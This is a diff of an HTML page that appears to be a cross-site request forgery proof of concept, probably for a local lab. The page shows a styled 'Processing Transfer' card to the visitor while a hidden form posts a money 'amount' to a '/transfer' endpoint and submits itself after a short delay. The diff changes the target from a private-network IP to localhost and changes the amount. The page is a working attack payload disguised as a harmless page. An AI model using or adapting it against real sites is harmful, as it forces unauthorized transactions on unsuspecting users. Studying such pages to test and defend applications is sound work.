@@ -1,22 +1,64 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Transfer</title>
+
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: Arial, sans-serif;
+      background: linear-gradient(135deg, #667eea, #764ba2);
+    }
+
+    .card {
+      background: white;
+      padding: 30px 40px;
+      border-radius: 12px;
+      box-shadow: 0 10px 30px rgba(0,0,0,.2);
+      text-align: center;
+      min-width: 280px;
+    }
+
+    h2 {
+      margin-top: 0;
+    }
+
+    .amount {
+      font-size: 32px;
+      color: #e53e3e;
+      font-weight: bold;
+      margin: 15px 0;
+    }
+
+    .loading {
+      margin-top: 15px;
+      color: #666;
+      font-size: 14px;
+    }
+  </style>
 </head>
 
 <body>
-    <form action="http://192.168.109.131:8080/transfer" method="POST">
-        <input type="hidden" name="amount" value="1000">
+  <div class="card">
+    <h2>Processing Transfer</h2>
+    <div class="amount">100 ฿</div>
+    <div class="loading">Please wait...</div>
+
+    <form action="http://localhost:8080/transfer" method="POST">
+      <input type="hidden" name="amount" value="100">
     </form>
+  </div>
+
+  <script>
+    setTimeout(() => {
+      document.forms[0].submit();
+    }, 1500);
+  </script>
 </body>
-
 </html>
-
-
-
-<script>
-    document.forms[0].submit();
-</script>
